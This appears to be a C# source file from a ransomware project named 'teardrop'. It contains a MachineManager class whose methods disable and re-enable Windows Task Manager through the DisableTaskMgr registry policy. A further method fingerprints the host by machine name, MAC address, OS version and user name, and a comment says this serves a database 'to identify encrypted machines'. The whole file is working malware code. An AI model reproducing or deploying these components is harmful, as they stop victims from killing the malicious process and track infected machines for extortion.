using DeviceId;
using Microsoft.Win32;
using System.Runtime.Versioning;

namespace teardrop
{
    internal sealed class MachineManager
    {
        [SupportedOSPlatform("windows")]
        public static void DisableTaskManager()
        {
            using (RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (objRegistryKey.GetValue("DisableTaskMgr") is null)
                {
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                }

                objRegistryKey.Close();
            }
        }

        [SupportedOSPlatform("windows")]
        public static void EnableTaskManager()
        {
            using (RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (objRegistryKey.GetValue("DisableTaskMgr") is not null)
                {
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                }

                objRegistryKey.Close();
            }
        }

        public static string GetDeviceInfo()
        {
            // Generate Device ID for Database to identify encrypted machines
            return new DeviceIdBuilder()
                .AddMachineName()
                .AddMacAddress()
                .AddOsVersion()
                .AddUserName()
                .ToString();
        }
    }
}
